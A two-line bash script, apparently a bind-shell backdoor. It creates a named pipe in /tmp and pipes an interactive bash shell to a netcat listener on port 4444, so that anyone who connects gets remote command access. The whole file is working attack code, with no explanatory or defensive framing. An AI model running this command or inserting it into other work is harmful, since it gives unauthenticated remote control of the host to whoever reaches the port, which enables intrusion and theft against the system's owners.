#!/bin/bash

mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -lvp 4444 > /tmp/f
